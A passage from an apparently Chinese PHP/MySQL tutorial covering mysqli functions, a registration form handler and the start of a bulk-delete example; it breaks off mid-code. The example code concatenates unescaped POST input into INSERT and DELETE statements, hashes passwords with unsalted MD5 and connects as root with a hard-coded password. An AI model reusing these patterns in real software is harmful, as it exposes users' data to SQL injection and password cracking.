href="post/PHP-MySQL#第六步-发送SQL语句"></a></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">PHP mysqli_query() 函数</a>]</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">功能</td><td align="left">发送SQL语句,执行一条 MySQL 查询。</td></tr><tr><td align="center">返回值</td><td align="left">mysqli_query() 仅对 SELECT，SHOW，EXPLAIN 或 DESCRIBE 语句<strong>返回一个资源标识符</strong>，<br>如果查询执行不正确则返回 FALSE。</td></tr><tr><td align="center">参数1</td><td align="left">传入mysqli_connect返回的资源</td></tr><tr><td align="center">参数2</td><td align="left">传入发送的SQL语句。注意：查询字符串不应以分号结束。</td></tr></tbody></table></div></div><blockquote><ol><li>SQL语句准备完成，需要通过mysqli_query将SQL语句发送给MySQL服务器。</li><li>MySQL服务器会执行发送过来的SQL语句进行执行。</li></ol></blockquote><p>&emsp;</p><h4 id="第七步-判断是否执行正常或者遍历数据"><font color="#3CB371" face="Comic sans MS">第七步:  判断是否执行正常或者遍历数据</font><a href="post/PHP-MySQL#第七步-判断是否执行正常或者遍历数据"></a></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_fetch_array.asp" target="_blank" rel="noopener">PHP mysqli_fetch_array() 函数</a>]</font><br>读取第6步中，发送的是select类别的语句，<font color="#FF7F00"><strong>通常需要将结果以数组形式输出显示出来</strong></font>。就需要用到遍历显示数据的函数。</p><p><font color="red"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysqli_fetch_array(data,array_type)</td></tr><tr><td align="center">功能</td><td align="left">得到result结果集中的数据，返回数组进行遍历</td></tr><tr><td align="center">参数1</td><td align="left">可选。规定要使用的数据指针。该数据指针是 mysqli_query() 函数产生的结果。</td></tr><tr><td align="center">参数2</td><td align="left">可选。规定返回哪种结果。可能的值：<br>MYSQL_ASSOC - 关联数组<br>MYSQL_NUM - 数字数组<br>MYSQL_BOTH - 默认。同时产生关联和数字数组</td></tr></tbody></table></div></div><p>&emsp;<br>下面举例几个常用的<strong>将mysqli_query()查询得到的字符串处理成数组的函数</strong>…….</p><p><font color="red"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">mysqli_fetch_assoc(data)</td><td align="left">返回根据从结果集取得的行生成的<strong>关联数组</strong>，如果没有更多行，则返回 false</td></tr><tr><td align="center">mysqli_fetch_row(data)</td><td align="left">返回根据从结果集取得的行生成的<strong>索引数组</strong>，如果没有更多行，则返回 false</td></tr><tr><td align="center">mysqli_fetch_object(data)</td><td align="left">从结果集（记录集）中取得一行作为对象。<br>若成功的话，本函数从 mysql_query() 获得一行，并返回一个对象。如果失败<br>或没有更多的行，则返回 false。</td></tr><tr><td align="center">mysqli_num_rows(data)</td><td align="left">返回结果集中行的数目。此命令仅对 SELECT 语句有效。<br>要取得被 INSERT，UPDATE 或者 DELETE 查询所影响到的行的数目，<br>用 mysqli_affected_rows()。</td></tr><tr><td align="center">mysqli_fetch_field</td><td align="left">从结果集中取得列信息并作为对象返回。</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="第八步-关闭数据库"><font color="#3CB371" face="Comic sans MS">第八步:  关闭数据库</font><a href="post/PHP-MySQL#第八步-关闭数据库"></a></h4><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_mysql_close.asp" target="_blank" rel="noopener">PHP mysql_close() 函数</a>]</font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysqli_close(link_identifier)</td></tr><tr><td align="center">功能</td><td align="left">关闭数据库连接</td></tr><tr><td align="center">返回值</td><td align="left">如果成功则返回 true，失败则返回 false。</td></tr><tr><td align="center">参数1</td><td align="left">传入mysqli_connect返回的资源</td></tr></tbody></table></div></div><p>&emsp;<br><font color="red" face="Comic sans MS"><strong>其他：显示服务器信息函数</strong></font> </p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysqli_get_server_info</td></tr><tr><td align="center">功能</td><td align="left">返回服务器信息</td></tr><tr><td align="center">参数1</td><td align="left">传入mysqli_connect返回的资源</td></tr></tbody></table></div></div><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">函数</td><td align="left">mysqli_get_server_version</td></tr><tr><td align="center">功能</td><td align="left">返回服务器版本</td></tr><tr><td align="center">参数1</td><td align="left">传入mysqli_connect返回的资源</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font><br>mysqli只学过程化的方法即可。在面向对象阶段实际工作中完全抛弃了mysqli的对象用法，而是使用的是PDO对象连接数据库的方式。</p></blockquote><p>&emsp;<br>&emsp;</p><h3 id="二-通过步骤做一个用户注册实例"><font color="#FF6347" face="Comic sans MS">二. 通过步骤做一个用户注册实例</font><a href="post/PHP-MySQL#二-通过步骤做一个用户注册实例"></a></h3><blockquote><p><font color="#FF7F00"><strong>我们做一个最简单的注册页面。注册页面中有三个参数：</strong></font></p><ol><li>用户名</li><li>密码</li><li>重复密码</li></ol><ul><li>用户写好三个参数后，点击提交的时候向<code>connect.php</code>页面中传入POST记录。</li><li>我们可以把<code>POST记录</code>处理后写入到MySQL数据库中，即完成了用户注。</li></ul></blockquote><blockquote><p><font color="#FF7F00"><strong>本例用到的两个文件：</strong></font></p><ol><li><code>index.php</code>：表单页面；</li><li><code>connect.php</code>：处理表单的页面。</li></ol></blockquote><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>一、 判断重复密码：</strong></font></p><blockquote><p>1.<strong>由于有重复密码，</strong><font color="#FF7F00"><strong>如果用户两次输入的密码不一致也就是有没有进行下一步的任何意义。</strong></font><br>2.<font color="#FF7F00"><strong>在网页中很多地方还是使用到了重复密码。</strong></font><strong>因为，害怕的是用户产生手误。将密码填写出错。</strong><br>3.<font color="#FF7F00"><strong>用户在输入密码的时候可能在左右两边多打两个空格。因此，我们会使用trim将密码和重复密码的两边去掉空格。</strong></font></p></blockquote><p>&emsp;<br>代码如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'repassword'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'两次密码不一致,请返回上一页'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>二、 准备好写入的数据：</strong></font><br>我们需要把用户的<strong>输入数据</strong>和<strong>隐藏的数据</strong>都写入到数据库。</p><p><font color="red"><strong>可见数据有：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">变量</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">$_POST[‘username’]</td><td align="left">用户名</td></tr><tr><td align="center">$_POST[‘password’]</td><td align="left">密码</td></tr></tbody></table></div></div><blockquote><ol><li>我们需要把用户名去掉两边的空格，这样避免输入不必要的这些信息。</li><li>在mysql这一章节我们讲过，用户的密码不要让包括公司内部人员可见。保证密码是不可逆向的。在初级阶段大家学习一下MD5即可。以后我们再教大家其他的加密方式。</li></ol></blockquote><p><font color="red"><strong>不可见数据有：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">变量</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">$time</td><td align="left">用户的注册时间</td></tr><tr><td align="center">$_SERVER[‘REMOTE_ADDR’]</td><td align="left">用户的注册IP</td></tr></tbody></table></div></div><blockquote><ol><li>time返回的unix时间戳</li><li>REMOTE_ADDR返回的是IP地址，我们可以用ip2long将其转为整型存储。</li></ol></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>三、连接数据库、判断错误、选择库和字符集：</strong></font></p><blockquote><ol><li>我们使用mysqli_connect连接到数据库服务器。</li><li>如果有错误，使用mysqli_errno得到错误号</li><li>如何时存在错误mysqli_error打印出所有的错误，并且退出程序执行</li><li>选择数据库并且设置字符集为utf8.</li></ol></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//连接数据库</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'liwenkaihaha'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果有错误，存在错误号</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_errno</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//选择数据库</span><span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//选择字符集</span><span class="token function">mysqli_set_charset</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>四、组合SQL语句：</strong></font><br>我们需要把得到的信息写入到数据库里面去，用户名、密码、创建时间、IP我们都得到了。</p><p>将对应的变量插入到SQL语句中即可。组合出来的SQL语句如下：<br><font color="#00B2EE"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into user(username,password,createtime,createip) values('"</span> <span class="token punctuation">.</span> <span class="token variable">$username</span> <span class="token punctuation">.</span> "'<span class="token punctuation">,</span><span class="token string">'" . $password . "'</span><span class="token punctuation">,</span><span class="token string">'" . $time . "'</span><span class="token punctuation">,</span><span class="token string">'" . $ip . "'</span><span class="token punctuation">)</span>"<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&emsp;<br>而我们的创建表的语句如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">user</span> <span class="token punctuation">(</span>id <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>username <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>password <span class="token function">char</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>createtime <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>createip <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token keyword">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>表的格式（字段对应说明）：<br><font color="#00B2EE"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">id</th><th align="center">username</th><th align="center">password</th><th align="center">createtime</th><th align="center">createip</th></tr></thead><tbody><tr><td align="center">用户编号</td><td align="center">用户名</td><td align="center">密码</td><td align="center">创建时间</td><td align="center">创建IP</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>五、发送语句，判断状态：</strong></font></p><blockquote><p>mysqli_query我们在上面说过，需要传入两个参数：</p><ol><li>连接的资源，在这里对应的变量是$conn。</li><li>发送的SQL语句。在上面已经准备好了$sql。</li></ol></blockquote><blockquote><p>SQL语句可以通过mysqli_query发送给MySQL服务器。发送成功$result则为true。否则为false。<br>成功的话，我们就可以提示用户注册成功啦。<br>有些情况下，可能还需要使用到<strong>mysqli_insert_id()</strong>。功能是获取上面通过insert插入数据的id并返回这个id。<br>mysqli_insert_id应用场景：新加的一个行的数据。我们需要得到自动增长的ID值，将这个ID值插入到另外一个表里面去时。就需要用到这个函数。</p></blockquote><p>&emsp;</p><p><code>mysqli_insert_id()</code>使用举例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'注册成功'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'注册失败'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'当前用户插入的ID为'</span><span class="token punctuation">.</span><span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>六、关闭数据库连接：</strong></font></p><p>将资源变量传到到mysqli_close这个函数里面即可。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;<br>&emsp;<br>&emsp;<br>先建立test数据库、user数据表。数据表建立语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">user</span> <span class="token punctuation">(</span>id <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span>username <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>password <span class="token function">char</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>createtime <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>createip <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token keyword">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>1. <code>index.php</code>表单页面：</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>connect.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    用户名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>    密码：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>    重复密码：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>repassword<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<br><font color="red"><strong>2. <code>connect.php</code>页面完整代码：</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'repassword'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'两次密码不一致,请返回上一页'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo $username."/".$password."/".$time."/".$ip;</span><span class="token comment" spellcheck="true">//如果有错误，存在错误号</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_errno</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_set_charset</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into user(username,password,createtime,createip) values ('$username','$password','$time','$ip')"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'成功'</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'失败'</span><span class="token punctuation">;</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"错误为："</span><span class="token punctuation">.</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"返回值："</span><span class="token punctuation">.</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'当前用户插入的ID为'</span> <span class="token punctuation">.</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="三-通过步骤做一个列表显示实例"><font color="#FF6347" face="Comic sans MS">三. 通过步骤做一个列表显示实例</font><a href="post/PHP-MySQL#三-通过步骤做一个列表显示实例"></a></h3><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1262.html" target="_blank" rel="noopener">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4977.html" target="_blank" rel="noopener">视频</a>]</font></p><p>&emsp;<br>&emsp;</p><h3 id="四-通过步骤操作之把用户做个分页"><font color="#FF6347" face="Comic sans MS">四. 通过步骤操作之把用户做个分页</font><a href="post/PHP-MySQL#四-通过步骤操作之把用户做个分页"></a></h3><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1273.html" target="_blank" rel="noopener">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4978.html" target="_blank" rel="noopener">视频</a>]</font></p><p>&emsp;<br>&emsp;</p><h3 id="五-批量和指定删除用户"><font color="#FF6347" face="Comic sans MS">五.  批量和指定删除用户</font><a href="post/PHP-MySQL#五-批量和指定删除用户"></a></h3><p>上面已经学过了通过步骤做一个列表显示，在删除前，<font color="#FF7F00"><strong>有单行删除数据和删除多行数据</strong></font>。</p><p>&emsp;</p><h4 id="5-1-判断是单选还是多选删除"><font color="#3CB371" face="Comic sans MS">5.1 判断是单选还是多选删除</font><a href="post/PHP-MySQL#5-1-判断是单选还是多选删除"></a></h4><blockquote><ol><li><font color="#FF7F00"><strong>单行是通过get传参的方式</strong></font>向delete.php文件中写上对应的ID。</li><li>而<font color="#FF7F00"><strong>多个删除是通过POST的方式</strong></font>向delete.php页面中传递对应的ID。</li><li>如果这两个都不符合的话，那我们可以视为数据不合法。</li></ol></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'数据不合法'</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="5-2-组合SQL语句"><font color="#3CB371" face="Comic sans MS">5.2 组合SQL语句</font><a href="post/PHP-MySQL#5-2-组合SQL语句"></a></h4><blockquote><ol><li>MySQL这一章讲解过<font color="#FF7F00"><strong>删除时可以使用到in的子语句</strong></font>。</li><li>同样在这里，我们就可以用in的子语句来达到效果。</li><li><font color="#FF7F00"><strong>join函数将多选删除传过来的id变为了3,4,5的格式</strong></font>，最终多选删除的SQL语句执行出来的效果就是：</li></ol></blockquote><pre class="line-numbers language-php"><code class="language-php">delete from user where id <span class="token function">in</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token 